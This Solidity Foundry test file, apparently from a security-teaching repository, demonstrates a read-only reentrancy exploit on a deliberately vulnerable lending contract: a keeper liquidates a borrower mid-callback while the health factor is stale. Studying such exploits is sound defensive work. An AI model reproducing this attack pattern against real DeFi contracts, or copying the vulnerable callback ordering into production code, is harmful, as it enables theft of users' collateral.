// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {LendingReadOnly, ILendingView} from "../src/vulnerable/LendingReadOnly.sol";
import {LendingGuard} from "../src/fixed/LendingGuard.sol";
import {Keeper} from "../src/attack/Keeper.sol";
import {Borrower} from "../src/attack/Borrower.sol";

contract ReadOnlyTest is Test {
    LendingReadOnly internal lending;
    Keeper internal keeper;
    Borrower internal borrower;

    function setUp() public {
        vm.deal(address(this), 1000 ether);
        lending = new LendingReadOnly();
        keeper = new Keeper(address(lending));
        borrower = new Borrower(address(lending), address(keeper));
    }

    function test_ExploitLiquidatesDuringCallback() public {
        // ─── Step 1: seed position ──────────────────────────────────────
        borrower.deposit{value: 200 ether}();
        borrower.borrow(100 ether);

        // After borrow + callback deposit: collateral = 300, debt = 100, HF = 3.0
        assertEq(lending.collateral(address(borrower)), 300 ether);
        assertEq(lending.debt(address(borrower)), 100 ether);
        assertEq(lending.healthFactor(address(borrower)), 3e18);

        // ─── Step 2: borrow triggers the exploit ────────────────────────
        // Pre-check: 300/100 = 3.0, passes.
        // Mid-callback: debt = 300, collateral still 300 → HF = 1.0 < 1.2 threshold.
        // Keeper reads HF = 1.0 and liquidates. THEN the compensating deposit runs.
        borrower.borrow(200 ether);

        // ─── Step 3: prove the loss ────────────────────────────────────
        // Keeper (integrator) seized the borrower's 300 ETH of collateral
        assertEq(lending.collateral(address(keeper)), 300 ether, "keeper seized collateral");

        // Borrower's debt was zeroed by liquidate; the only collateral they have
        // is the 200 they re-deposited after being liquidated
        assertEq(lending.debt(address(borrower)), 0, "debt zeroed");
        assertEq(lending.collateral(address(borrower)), 200 ether, "borrower has only redeposit");
    }
}
